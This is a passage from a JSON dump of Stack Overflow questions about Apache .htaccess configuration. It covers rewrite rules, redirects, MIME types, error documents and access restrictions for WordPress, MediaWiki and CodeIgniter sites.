href=\"http://stackoverflow.com/questions/12115652/htaccess-caching-with-filesmatch\">this question</a> answer I've found solution that works:</p>\n\n<pre><code>&lt;FilesMatch \"(?&lt;!\\.css|\\.js)$\"&gt;\n    Header append Cache-Control max-age=3600\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Unfortunatelly can't find a way to leave dot <code>\\.</code> outside of brackets. But still this solution fine for me. </p>\n\n<p>As a side note, <em>all other files</em> include ones with not filename at all, like <code>http://example.com/</code>.</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","rewrite","mediawiki"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12930156,"title":"Mediawiki's thumbnail handler (rewrite) doesn't work","body":"<p>My .htaccess:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^/?wiki(/.*)?$ %{DOCUMENT_ROOT}/w/index.php [L]\nRewriteRule ^/?$ %{DOCUMENT_ROOT}/w/index.php [L]\n\nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_URI} !-f\nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_URI} !-d\nRewriteRule ^/?w/images/thumb/[0-9a-f]/[0-9a-f][0-9a-f]/([^/]+)/([0-9]+)px-.*$ %{DOCUMENT_ROOT}/w/thumb.php?f=$1&amp;width=$2 [L,QSA,B] \n\nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_URI} !-f\nRewriteCond %{DOCUMENT_ROOT}%{REQUEST_URI} !-d\nRewriteRule ^/?w/images/thumb/archive/[0-9a-f]/[0-9a-f][0-9a-f]/([^/]+)/([0-9]+)px-.*$ %{DOCUMENT_ROOT}/w/thumb.php?f=$1&amp;width=$2&amp;archived=1 [L,QSA,B]\n</code></pre>\n\n<p>index.php rewrite rule works, but thumbnail doesn't.\nIf get thumb.php directly, it works:</p>\n\n<pre><code>thumb.php?f=test.jpg&amp;width=180\n</code></pre>\n\n<p>So, the problem is in rewriting. I've tried many variants, but it still doesn't work. Where may be the mistake?</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12928360,"title":"how to disable mod_security in .htaccess file?","body":"<p>How can we disable \"mod_security\" by using .htaccess file on apache server?</p>\n\n<p>Actually I am using wordpress on my personal doamin and posting a post which content has some code block and as per my hosting provider said \"mod_security\" gives an error and my IP has gone into firewall because of mod_security.</p>\n\n<p>So i want to disable \"mod_security\" by using .htaccess file.....</p>\n"},{"tags":[".htaccess","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12927051,"title":"Problems with mod_rewrite going from dev to live server","body":"<p>I just uploaded a new project to the live server, which has a base ubuntu server install (latest LTS version).</p>\n\n<p>I am having some weird problems with mod_rewrite, which works fine on my dev system. On the live server, it runs with no errors in the error.log and correctly finds the files with .php extension, but does not populate the \"path_info\" GET parameter. </p>\n\n<p>The .htaccess file is as follows:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([A-Za-z0-9\\-_\\.]+)(/[A-Za-z0-9\\-_\\.\\/]*)?$ $1.php?path_info=$2 [QSA]\n</code></pre>\n\n<p>What do I need to look for to fix this? </p>\n"},{"tags":[".htaccess","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12927170,"title":"redirect multiple sub domains to single directory","body":"<p>I am looking for a way to distribute my images within my wordpress images folder located at\n<a href=\"http://www.my-site.com/wp-content/uploads/\" rel=\"nofollow\">http://www.my-site.com/wp-content/uploads/</a> to <a href=\"http://img1.my-site.com/wp-content/uploads/\" rel=\"nofollow\">http://img1.my-site.com/wp-content/uploads/</a> &amp; <a href=\"http://img2.my-site.com/wp-content/uploads/\" rel=\"nofollow\">http://img2.my-site.com/wp-content/uploads/</a> &amp; <a href=\"http://img3.my-site.com/wp-content/uploads/\" rel=\"nofollow\">http://img3.my-site.com/wp-content/uploads/</a> to increase the speed of page load by allowing the browser to download these in parallel? I have looked at htaccess redirects and rewrite and am looking for a way to direct this one folder and across the multiple sub domains.</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12925109,"title":"htaccess conflict in mulitple domain","body":"<p>first time i am facing this kind of problem, Actually i had a single domain <code>(example.com)</code> which is hosted in godaddy hosting accout, Recently i bought another one domain <code>(example2.com)</code> these both domain i have hosted in the same hosting account.  </p>\n\n<p>Now Let i tell you the path for the both the domains: </p>\n\n<p><code>example.com in on the / folder</code><br>\n<code>example2.com in on the /example2 folder</code> </p>\n\n<p>i have created 3 sub-domains with my <code>example.com</code> domain and the hosting account created the folder for the same sub-domains on the the / directory.  </p>\n\n<p>lets say <code>demo.example.com</code> and the folder is <code>/demo</code></p>\n\n<p>Now come to the second domain, recently i have created a sub-domain for my <code>example2.com</code>   </p>\n\n<p>that is <code>test.example2.com</code> which is located on the root with the folder <code>/test</code> not like <code>/example2/test</code> because my second domain is in the <code>/example2</code> folder </p>\n\n<p>Now the problem is when i enable the .htaccess file for my <code>test.example2.com</code> i got the  </p>\n\n<p><code>500 Internal Server Error</code>  </p>\n\n<pre><code>AddDefaultCharset UTF-8\n\nErrorDocument 404 /404error.php\n\nOptions +FollowSymlinks -MultiViews\nRewriteEngine on\n\nRewriteBase /\n\nRewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/)$\nRewriteRule (.*)([^/])$ http://%{HTTP_HOST}/$1$2/ [R=301,L]\n\n\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /.*index\\.php\\ HTTP/\n\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteCond %{HTTP_HOST} !^localhost\nRewriteRule .* http://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\nRewriteRule ^(all)/([^/]+)/?$ story.php?title=$2 [L]\nRewriteRule ^(all)/?$ index.php [R=301,L]\n</code></pre>\n\n<p>here is a bit part of the <code>.htaccess</code> file but without htaccess its working fine, i think i have problem with the <code>RewriteBase</code>   </p>\n\n<p>i also tried with like <code>RewriteBase /test/</code></p>\n\n<p>and <code>RewriteBase /example2/test/</code> </p>\n\n<p>but didn't helpful, can anyone tell me where is the problem, and how do i debug this problem??  </p>\n\n<p>but rest of this my other sub-domain working fine.</p>\n\n<p><strong>UPDATE ERROR LOG</strong></p>\n\n<pre><code>[Tue Oct 16 21:47:04 2012] [alert] [client 110.172.129.110] /var/chroot/home/content/06/8871106/html/bestsocialbookmark/.htaccess: Option All not allowed here\n[Tue Oct 16 21:47:07 2012] [alert] [client 110.172.129.110] /var/chroot/home/content/06/8871106/html/bestsocialbookmark/.htaccess: Option All not allowed here\n</code></pre>\n\n<p>being true, i don't know what it's mean..</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12925714,"title":"htaccess to change only URL address","body":"<p>I have a site and need htaccess code to make this change in the address bar without making any physical changes in the server folders</p>\n\n<p>example.com/data/65767.html\nto be\nexample.com/65767</p>\n\n<p>example.com/data/56-45.html\nto be\nexample.com/56-45</p>\n\n<p>Regards</p>\n"},{"tags":["wordpress","apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12890374,"title":"htaccess redirect domain to wordpress page?","body":"<p>I have a domain page <a href=\"http://www.domain.com\" rel=\"nofollow\">http://www.domain.com</a> or domain.com</p>\n\n<p>and I would like to use htaccess to redirect <a href=\"http://www.domain.com\" rel=\"nofollow\">http://www.domain.com</a> or domain.com to domain.wordpress.com</p>\n\n<p>I currently have this:</p>\n\n<pre><code>RewriteOptions inherit\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\n\nRewriteCond %{HTTP_HOST} ^domain\\.com$ [OR]\nRewriteCond %{HTTP_HOST} ^www\\.domain\\.com$\nRewriteRule ^/?$ \"http\\:\\/\\/domain\\.wordpress\\.com\\/\" [R=301,L]\n</code></pre>\n\n<p>It is not redirecting, can someone assist me?</p>\n\n<p>Thank you!</p>\n"},{"tags":["php","apache",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12848722,"title":".htaccess with ^(.*)$ index.php/$1 gives \"No input file specified\"","body":"<p>I'm running Code Igniter and my .htaccess was:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php?$1 [L]\n    RedirectMatch 404 /\\\\.svn(/.*|$)\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Then I realized that no $_GET variable was getting through.</p>\n\n<p>I followed some instructions to create the .htaccess to use together with Code Igniter, and replaced the <code>index.php?$1</code> with <code>index.php/$1</code>. This works on a linux machine, but on the Windows it doesn't. I'm sure it is a server configuration, but I don't know which one.</p>\n\n<p>Assuming that I access</p>\n\n<pre><code>http://localhost/directory/this_is_query/string_parameters?with_some=additional_ones\n</code></pre>\n\n<p>The <code>$_SERVER['QUERY_STRING']</code> value with <code>index.php?$1</code> on .htaccess is:</p>\n\n<pre><code>string(31) \"this_is_query/string_parameters\" \n</code></pre>\n\n<p>And with <code>index.php/$1</code>:</p>\n\n<pre><code>No input file specified. \n</code></pre>\n\n<p>On the Linux machine I have:</p>\n\n<pre><code>string(31) \"with_some=additional_ones\"\n</code></pre>\n\n<p>As response with <code>index.php/$1</code>.</p>\n\n<p>Any thoughts?</p>\n\n<hr>\n\n<p>I'm debugging the <code>$_SERVER['QUERY_STRING']</code> variable on the FIRST line of <code>index.php</code>, with NO interaction with Code Igniter whatsoever.</p>\n\n<p>Yes, I do have <code>mod_rewrite</code>.</p>\n\n<h2> THIS IS NOT THE SAME AS <a href=\"http://stackoverflow.com/questions/10361742/codeigniter-no-input-file-specified-error\">Codeigniter no input file specified error</a></h2>\n\n<p>I saw that question before asking this one. And I'm still with the issue.</p>\n\n<p>I've added new information.</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12925861,"title":"web.config to .htaccess","body":"<p>After much tests, I am stuck at converting a web.config to .htaccess</p>\n\n<p>I am finding that there is redirect loop issue. </p>\n\n<p>Here is web.config code</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;rewrite&gt;\n            &lt;rules&gt;\n                &lt;clear /&gt;\n                &lt;rule name=\"Rewrite Client URL\" enabled=\"true\" stopProcessing=\"true\"&gt;\n                    &lt;match url=\"^([a-zA-Z0-9\\-+]+)(\\/([a-zA-Z0-9\\-\\.]+)?)?$\" /&gt;\n                    &lt;conditions logicalGrouping=\"MatchAll\"&gt;\n                        &lt;add input=\"{R:1}\" negate=\"true\" pattern=\"manage\" /&gt;\n                        &lt;add input=\"{R:3}\" negate=\"true\" pattern=\"^$\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"{R:3}?client={R:1}\" appendQueryString=\"true\" /&gt;\n                &lt;/rule&gt;\n                &lt;rule name=\"When no files are specified\"&gt;\n                    &lt;match url=\"^([a-zA-Z0-9\\-+]+)(\\/([a-zA-Z0-9\\-\\.]+)?)?$\" /&gt;\n                    &lt;conditions logicalGrouping=\"MatchAll\"&gt;\n                        &lt;add input=\"{R:1}\" negate=\"true\" pattern=\"manage\" /&gt;\n                        &lt;add input=\"{R:3}\" pattern=\"^$\" /&gt;\n                    &lt;/conditions&gt;\n                    &lt;action type=\"Rewrite\" url=\"index.php?client={R:1}\" /&gt;\n                &lt;/rule&gt;\n            &lt;/rules&gt;\n        &lt;/rewrite&gt;\n        &lt;defaultDocument&gt;\n            &lt;files&gt;\n                &lt;add value=\"index_flash.php\" /&gt;\n            &lt;/files&gt;\n        &lt;/defaultDocument&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Here is my .htaccess code</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([a-zA-Z0-9\\-+]+)(\\/([a-zA-Z0-9\\-\\.]+)?)?$ $1?client=$2\nRewriteRule ^([a-zA-Z0-9\\-+]+)(\\/([a-zA-Z0-9\\-\\.]+)?)?$ index.php?client=$1\n</code></pre>\n"},{"tags":["html",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12924576,"title":"Make restricted videos usable by video player","body":"<p>I have a bunch of .mp4 videos on my website.  I was attempting to make it so they could not be accessed via people going to their absolute locations on my website.</p>\n\n<p>I don't want people to be able to navigate to <a href=\"http://mysite.com/video/some_video.mp4\" rel=\"nofollow\">http://mysite.com/video/some_video.mp4</a> and download my videos.</p>\n\n<p>I modded my .htaccess to restrict .mp4 from being seen.</p>\n\n<p><code>&lt;Files ~ \"\\.mp4$\"&gt;\nOrder allow,deny\nDeny from all\n&lt;/Files&gt;</code></p>\n\n<p>This works however, it also disables the video from playing inside of my player.</p>\n\n<p>Is there any way to restrict access to the .mp4 files inside of a certain directory while still enabling my scripts (video player) to access them?</p>\n\n<p>Any input is appreciated, thanks!</p>\n\n<p><strong>Fixed</strong>\nI was able to get this working finally! Thanks RussellHarrower!</p>\n\n<p>Here is what my .htaccess looks like</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_REFERER} !^http://(.+\\.)?domain\\.net/ [NC]\nRewriteRule ^.*$ http://domain.net/404 [L]\n&lt;Files .mp4&gt;\nOrder Deny,Allow\nDeny from all\nAllow from my_servers_ip_address\n#allow from env=internal\n&lt;/Files&gt;\n</code></pre>\n"},{"tags":[".htaccess","subdirectory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12924358,"title":"htaccess rewrite subdirectory's index.html","body":"<p>I stumbled the internet, but 'htaccess' still is not my thing :S</p>\n\n<p>I have the following site structure:</p>\n\n<p>ROOT -- DIR PORTFOLIO -- DIR CLIENTNAME -- index.html</p>\n\n<p>I thought that was the best way to have a clean URL, 'cause I can make links like:</p>\n\n<p>www.sample.com/portfolio/clientname</p>\n\n<p>Except for the fact that the browser adds a trailing slash at the end of the URL, like so:</p>\n\n<p>www.sample.com/portfolio/clientname/</p>\n\n<p>That really is my problem. I don't want that to happen, just for the 'simple' reason that Facebook doesn't see that page correctly, and thus is refering to the meta's on the ROOT index file...</p>\n\n<p>So if I than try to paste the link without the last trailing slash, Facebook gets the right meta's from the clientname's page.</p>\n\n<p>Is there a way I can fix this with a htaccess file? Or am I doing this totally wrong anyway?</p>\n"},{"tags":["php",".htaccess","parsing","png","picture"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12924314,"title":"Parsing PNG as PHP via htaccess works only on local server but not on webserver","body":"<p>I have created a dynamic PNG-picture in PHP. In order to use the PNG extension I created a .htaccess-File with the following content:</p>\n\n<pre><code>AddType application/x-httpd-php .png\n</code></pre>\n\n<p>On my local XAMPP server everything works perfect, but after uploading the files on a webserver it doesn' t work anymore. When I access the file, the PHP-Code of the file is displayed.<br><br>\nThese are the 2 different answers from both servers:\n<br><br>\n<strong>Local Server:</strong></p>\n\n<pre><code>HTTP/1.1 200 OK\nDate: Tue, 16 Oct 2012 21:51:58 GMT\nServer: Apache/2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1\nLast-Modified: Sat, 07 Feb 2009 11:47:04 GMT\nEtag: \"9000000024598-1e66-46252b23c9e00\"\nAccept-Ranges: bytes\nContent-Length: 7782\nKeep-Alive: timeout=5, max=99\nConnection: Keep-Alive\nContent-Type: image/x-icon\n</code></pre>\n\n<p><strong>Webserver:</strong></p>\n\n<pre><code>HTTP/1.1 200 OK\nDate: Tue, 16 Oct 2012 21:55:17 GMT\nServer: Apache/2.2.21 (Unix) mod_ssl/2.2.21 OpenSSL/0.9.8r\nLast-Modified: Tue, 16 Oct 2012 21:21:56 GMT\nEtag: \"db0f1b0-afc-4cc33be6befa5\"\nAccept-Ranges: bytes\nContent-Length: 2812\nKeep-Alive: timeout=3, max=100\nConnection: Keep-Alive\nContent-Type: application/x-httpd-php\n</code></pre>\n\n<p>So somehow the file doesn' t get parsed. I really don' t know where to start here.</p>\n"},{"tags":["php","apache",".htaccess","authentication","restriction"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12924041,"title":"Same htaccess login for subdomains","body":"<p>I'm looking for a way to secure a domain and his subdomains with an htaccess with only one login for all.</p>\n\n<p>I currently have a domain for each client like: <code>client.domain.com</code>.</p>\n\n<p>Every client's project has an URL like <code>projectXX.client.domain.com</code>.</p>\n\n<p>Every client and project have their own virtualhost. For now I'm using an htaccess based on a mysql DB with user/passwd/group for each project.</p>\n\n<p>I'm looking to a way to protect client.domain.com and grant the access from this url to the subdomains <code>projectXX.client.domain.com</code>.</p>\n\n<p>Of course a direct access to a project url without a login first will redirect to the main domain.</p>\n\n<p>I've tested <code>auth_digest</code> without any success (maybe I didn't use it properly) and I saw <code>auth_tkt</code> but I didn't understand how it really works.</p>\n\n<p>I'm running Apache 2.2.</p>\n\n<p>Looking for any tips or way to explore.</p>\n"},{"tags":["html5","apache",".htaccess","html5-video"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12671543,"title":"HTML5 video - incorrect Mime Types","body":"<p>I've built a little website for my mate's birthday party and I've used FlareVideo jQuery plugin to load/play the video which includes a flash fallback. Now it seemed to work alright in Chrome, but in Firefox it shows a \"No video with supported format and MIME type found.\" error. I've modified the <strong>.htaccess</strong> file with the following content:</p>\n\n<pre><code>AddType video/ogg .ogv\nAddType video/mp4 .mp4\nAddType video/webm .webm\nSetEnvIfNoCase Request_URI \\.(og[gv]|mp4|m4v|webm)$ no-gzip dont-vary\n</code></pre>\n\n<p>But it didn't help. Also when typing in the video <a href=\"http://www.justo25.com/promo.mp4\" rel=\"nofollow\">URL</a> directly it works alright. If anyone has any clue I'd appreciate it a lot!</p>\n\n<p>Thanks!</p>\n"},{"tags":["wordpress",".htaccess","redirect","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12921309,"title":"Redirecting subdomains to wordpress content","body":"<p>I have one single Wordpress application on domain www.mywpsite.com.</p>\n\n<p>I have static pages:</p>\n\n<pre><code>a. www.mywpsite.com/subsite\nb. www.mywpsite.com/subsite/child1\nc. www.mywpsite.com/subsite/child2\n</code></pre>\n\n<p>and need that content to be respectively addressed using a subdomain like this:</p>\n\n<pre><code>a. subsite.mywpsite.com\nb. subsite.mywpsite.com/child1\nc. subsite.mywpsite.com/child2\n</code></pre>\n\n<p>Note that there is no physical structure for the subdomain, it is just a way of aliasing, and there is only one Wordpress installation under one document root. Also, I have a few pages and just one subdomain to work with, so a 'case by case' solution is valid. </p>\n\n<p>Eventually I will also use the same subdomain for some dynamic content:</p>\n\n<pre><code>d. www.mywpsite.com/category/subsitenews =&gt; subsite.mywpsite.com/news\n</code></pre>\n\n<p>Finally, if possible, I need that the url retained in the address bar is the one using the subdomain, I mean:</p>\n\n<ol>\n<li>The user types subsite.mywpsite.com/some-static-or-dynamic-content.</li>\n<li>Redirection is performed to the appropriate wordpress content, and content is delivered. </li>\n<li>The url in the user is still the same using subdomain, instead of the redirected url. </li>\n</ol>\n\n<p>How can I do this?</p>\n\n<p>I think I must use .htaccess but I have no idea how it works. I'm not sure if other questions I have found have to do with my problem. </p>\n\n<p><a href=\"http://stackoverflow.com/questions/7475249/redirect-subdomain-and-retain-url-structure\">redirect subdomain and retain url structure</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/11353139/htaccess-redirect-fake-subdomain-domain-com-to-domain-com\">.htaccess redirect ~ [fake-subdomain.domain.com/*] to [domain.com/*]</a></p>\n\n<p>Thank you very much. </p>\n"},{"tags":[".htaccess","redirect","mobile","wildcard","http-host"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12807250,"title":"Use htaccess to redirect mobile, only if target is homepage","body":"<p>I used the method described at: <a href=\"http://stackoverflow.com/questions/3680463/mobile-redirect-using-htaccess\">Mobile Redirect using htaccess</a> to redirect mobile. Works great.</p>\n\n<p>Now, what my client is trying to do is, even if someone is on mobile, if they are trying to access that is not the homepage, then they do NOT get redirected. So, if they ARE opening the homepage, the redirect works as normal. If, for example, they are opening anything else such as the blog, it does not redirect to the mobile site. </p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12923344,"title":".htaccess file causing site to go 403","body":"<p>Why would a blank .htaccess file cause a site to go 403? It works fine in subdirectories, but if I put an .htaccess file in the public root of my site, it goes 403.</p>\n"},{"tags":[".htaccess","mediawiki"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12919405,"title":"MediaWiki Rewrite by htaccess","body":"<p>I'm using MediaWiki and after installation, I want to rewrite URL as <code>domain.com/wiki/Page_Title</code>\nHere's my .htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nOptions +FollowSymLinks\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\nRewriteRule ^(.*)\\&amp;(.*)$ $1\\%26$2\n\nRewriteRule ^wiki/?(.*)$ /w/index.php?title=$1 [L,QSA]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>And here's my LocalSettings.php</p>\n\n<pre><code>$wgScriptPath       = \"\";\n$wgArticlePath      = \"/wiki/$1\";\n$wgScriptExtension  = \".php\";\n$wgRedirectScript   = \"$wgScriptPath/redirect.php\";\n\n$wgUsePathInfo = true;\n</code></pre>\n\n<p>It does work for domain/wiki/Page_Title but doesn't work for domain/wiki/Category:Some_Category.</p>\n\n<p>Any helps?</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12920762,"title":"How to break redirect loop in htaccess and wordpress","body":"<p>I have a wordpress site and I want to add a music player to it in a way that music is not interrupted, and visitors can browse the website while listening continuously to the music </p>\n\n<p>I added two iframes: The first loads his website, while the other one loads the music player. Then I put both in a wrapper called home.php and added the following rule to .htaccess file:</p>\n\n<p><code>DirectoryIndex home.php</code></p>\n\n<p>So the wrapper would load instead of index.php from Wordpress. The code of home.php is as follows:</p>\n\n<pre><code> &lt;iframe class=\"miMarco\" src=\"index.php\"&gt;&lt;/iframe&gt;\n &lt;iframe src=\"audio/index.php\" frameborder=\"0\" width=\"230\" height=\"70\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>And that's all I've changed. </p>\n\n<p>The complete .htaccess looks like this:</p>\n\n<pre><code># Use PHP5 Single php.ini as default \nAddHandler application/x-httpd-php5s .php\nDirectoryIndex home.php\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>The problem arises when I go to the website, and home.php loads as the index, and then it enters a redirect loop because loads  the music player on and on, and never loads the wordpress site.</p>\n\n<p>Any ideas why is this happening? Is this an .htaccess issue or a wordpress issue? Thanks!</p>\n"},{"tags":["apache",".htaccess","codeigniter","mod-rewrite","redirect"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":310,"score":0,"question_id":11113366,"title":"HTACCESS ErrorDocument 404 /404.htm not working","body":"<p>Am using COdeigniter.. \nI have a .htaccess. ANd the problem is that the server when access www.example.com/notfoundimage.png which is not available on server, should redirect it to .404htm (designed error document template)... however instead, it  gives a server error</p>\n\n<p>HTACCES:</p>\n\n<pre><code>ErrorDocument 404 /404.htm \nErrorDocument 400 /404.htm\nErrorDocument 403 /404.htm\n\nErrorDocument 500 /404.htm\n</code></pre>\n\n<p>Error when accessing non-existent file www.example.com/notfoundimage.png</p>\n\n<blockquote>\n  <p>Server error The website encountered an error while retrieving\n  <a href=\"http://www.example.com/notfoundimage.png\" rel=\"nofollow\">http://www.example.com/notfoundimage.png</a>. It may be down for\n  maintenance or configured incorrectly.</p>\n</blockquote>\n\n<p>If i comment this line from htaccess </p>\n\n<blockquote>\n  <p>ErrorDocument 404 /404.htm</p>\n</blockquote>\n\n<p>The error 404 (which should be) comes up. But i need the above line to redirect 404 to my template page: 404.htm</p>\n"},{"tags":["osx",".htaccess","mod-rewrite","mamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":331,"score":0,"question_id":10103707,"title":"Clean URLs on OS X with MAMP using htaccess [SOLVED]","body":"<p>Last weekend I set up a new site at home on Windows (with xampp). Everything works, I get clean URLs (like <a href=\"http://mysite.com/page/about\" rel=\"nofollow\">http://mysite.com/page/about</a>). Today I had to bring the files to my office where I'm using a Mac with MAMP and nothing worked. I change <code>AllowOverride</code> to <code>All</code> in the /Applications/MAMP/conf/apache/httpd.conf file, and enabled <code>LoadModule rewrite_module modules/mod_rewrite.so</code>, with no luck. (Of course, I restarted MAMP)\nBut nothing happend. All of my webrowsers tell me nothing about the error. Just got the 'localhost:8888/' at the title.</p>\n\n<p>I use these lines in .htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n   RewriteEngine on\n   RewriteRule ^([A-Za-z0-9_-]+)(/)?$ index.php?page=$1 [QSA]\n   RewriteRule ^page/([A-Za-z0-9_-]+)(/)?$ index.php?page=page&amp;uri=$1\n   RewriteRule ^work/([A-Za-z0-9_-]+)(/)?$ index.php?page=work&amp;uri=$1\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>What else I could do to make this working?\nThanks a lot.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12905898,"title":"htaccess rewrite engine makes trailing hash","body":"<p>For some reason my rewrite engine is adding a random hash to the end of my links such as: #.UHyohWmDRhA</p>\n\n<pre><code>RewriteEngine On \nRewriteRule   ^about/$   about.php  [NC]\n</code></pre>\n\n<p>So what I expect is localhost/company/about/.  What I get is localhost/company/about/#.UHyohWmDRhA. Anyway to get that to stop?</p>\n\n<p>EDIT------------------------<br/>\nWell I did not debug this well enough.  My apologies.  All of my links are generating this strange hash.  Will have to investigate further.</p>\n\n<p>EDIT.2------------------------<br/>\nMy mistake.  I have an addthis widget on my headers which is adding the hash.  Will answer in 2 days for whatever it's worth.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12915646,"title":"Need help on Rewrite Rules","body":"<p>The actually URL which my app uses is:</p>\n\n<p><code>http://site.com/gallery?id=23</code>\nbut I would like it to be possible to achieve the same with</p>\n\n<p><code>http://site.com/topic/place/new-delhi/gallery/23</code>\nI have no experience of rewrite rules, how can I set this up?</p>\n\n<p>where 'place' and 'new-delhi' are two dynamic values.\nIs this possible? Thanks.</p>\n"},{"tags":["php",".htaccess","zen-cart","zen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":238,"score":0,"question_id":11412656,"title":"Ceon SEO URl gives the error page not found in zen cart","body":"<p>I have installed a zen cart plugin <code>\"Ceon's SEO URL\"</code>.</p>\n\n<p>Admin panel has no errors in the installation but on the site when I click on the Product name it shows 404 error.</p>\n\n<p>I am trying to follow  installation steps of ceon's plugin but I am facing the problem</p>\n\n<pre><code>8.Add the Rewrite Rule to the Webserver (Apache/IIS etc.)\n</code></pre>\n\n<p>so please help me. </p>\n\n<p>I have this .htaccess file on this path <code>htdocs\\zencarttest\\zencart</code> and my .htaccess is as folow</p>\n\n<pre><code>## BEGIN CEON URI MAPPING REWRITE RULE\n\nRewriteEngine On\n\n# ONLY rewrite URIs beginning with /zencarttest/zencart/\nRewriteCond %{REQUEST_URI} ^/zencarttest/zencart/ [NC]\n\n# Don't rewrite any URIs ending with a file extension (ending with .[xxxxx])\nRewriteCond %{REQUEST_URI} !\\.[a-zA-Z]{2,5}$ [OR]\nRewriteCond %{REQUEST_URI} \\.(html)$ [NC]\n\n\n\n\n# Don't rewrite any URIs for some specific file format extensions,\n#   which are not covered by main file extension condition above\n#   Uncomment the following line to apply this condition! (Remove the # at the start of the next line)\nRewriteCond %{REQUEST_URI} !\\.(3gp|3g2|h261|h263|mj2|mjp2|mp4v|mpg4|m1v|m2v|m4u|f4v|m4v|3dml)$ [NC]\n\n# Don't rewrite admin directory\nRewriteCond %{REQUEST_URI} !^/zencarttest/zencart/admin_test [NC]\n\n# Don't rewrite editors directory\nRewriteCond %{REQUEST_URI} 